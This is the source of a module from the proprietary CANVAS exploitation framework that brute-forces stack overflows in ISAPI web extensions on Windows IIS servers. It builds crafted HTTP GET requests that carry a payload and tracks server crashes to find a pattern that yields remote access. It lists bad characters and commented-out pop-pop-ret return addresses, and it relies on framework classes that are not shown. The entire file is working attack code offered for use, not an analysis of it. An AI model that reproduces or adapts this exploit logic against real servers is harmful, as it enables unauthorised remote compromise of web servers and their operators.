#! /usr/bin/env python
"""
Blind ISAPI attack script
"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

VERSION="1.0"
NAME="blindisapi"
CHANGES="""
1.0 released.

"""


notes="""

"""

#http://www.immunityinc.com/CANVAS/
#Questions, comments: dave@immunityinc.com
#

import os,getopt
import sys
if "." not in sys.path: sys.path.append(".")


import socket
from exploitutils import *


import time
from tcpexploit import tcpexploit
import urllib
import canvasengine
import time


#TODO: FIX THESE
DOCUMENTATION={}
DOCUMENTATION["Notes"]="This module is useful for attacking ISAPI dll's for which you cannot obtain the DLL itself. It blindly tries to find a pattern that will get you remote access to the server. It can take a while to run, but is worth it."
DOCUMENTATION["Date public"]="05/01/2001"

DESCRIPTION="Blind ISAPI stack overflow brute forcer"

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"

from ExploitTypes.blindStack import blindStack

class theexploit(blindStack):
    def __init__(self):
        blindStack.__init__(self)
        
        self.setPort(80)
        self.setHost("")
        self.ssl=0
        self.setVersion(1)
        self.badstring="\x00\x0a\x0d\x20\x25&"
        self.bodystring=""
        self.scriptstring=""
        
        self.setVersions()
        self.name=NAME
        self.startcrash=1
        #eipaddr is pop pop ret
        #self.defaultfingerprints=[{"eipaddr": 0x10011579, "size":748, "safeaddrnum": 0}]
        #self.defaultfingerprints=[{"eipaddr": 0x10011579, "size":516, "safeaddrnum": 58}]
        #self.defaultfingerprints+=[{"safeaddrnum":69,"size":507,"eipaddr":0x77f92a9b}]
        self.totalcrashed=0
        self.totalrequests=0
        self.scriptandarguments="/?ATTACK"
        self.attackmethod="GET"
        return

    
    def test(self):
        "hardcoded to not return true"
        #self.log("A"*5000)
        return 0
    
    def sendpayload(self,payload):
  
        self.ssl=self.argsDict.get("ssl", self.ssl)
        #payload=urllib.quote_plus(payload) #turns out you can't do this. Grrr.
        attackstring=self.argsDict.get("scriptandarguments",self.scriptandarguments).replace("ATTACK",payload)
        method=self.argsDict.get("attackmethod",self.attackmethod).replace("ATTACK",payload)
        bodystring=self.argsDict.get("body",self.bodystring).replace("ATTACK",payload)
        attackstring="%s %s HTTP/1.0\r\n"%(method,attackstring)
        attackstring+="Host: localhost\r\n"
        attackstring+="Content-Length: %d\r\n"%len(bodystring)
        attackstring+="\r\n"
        attackstring+=bodystring
        
        self.log("Sending: %s"%small_prettyprint(attackstring))
        for tries in xrange(0,10):
            s=self.gettcpsock()
            try:
                s.connect((self.host, self.port))
            except:
                self.log("Could not connect to port %s"%self.port)
                return 0
            s.set_timeout(0.4)
            self.log("Connected to target.")
            try:
                self.websend(s,attackstring)
            except:
                self.log("Broken pipe!")
                continue
            break
        data=self.checkisapiGO(s)
        if self.ISucceeded():
            return 
        data=self.webrecv(s)
        self.log("Data=%s"%data)
        if data=="" or data.count("Server Error"):
            # or data.count("400 Bad Request") # this indicates a SP protected Isapi...
            self.crashed=1
        else:
            self.crashed=0
        self.log("recv data=%s"%prettyprint(data))
        self.totalrequests+=1
        if self.crashed:
            self.totalcrashed+=1
        self.log("Totalrequests=%d total crashed=%d"%(self.totalrequests,self.totalcrashed))
        #1.2 just takes forever, and doens't seem to help
        time.sleep(0.2) #this is here to let the server recover - otherwise you'll get RPC Server Failed errors
        s.close()
        return 1
    
    def usage(self):
        import sys
        print "Usage: %s -t target [-p port:80] [ -s ] -l localip -d localport [-v version]"%sys.argv[0]
        print "-s indicates SSL"
        self.printversions()
        
    def printversions(self):
            print "Versions: "
            print "\t1 - Windows (any) "
            return

    
    
#this stuff happens.
if __name__ == '__main__':
    app = theexploit()    
    ret=standard_callback_commandline(app)
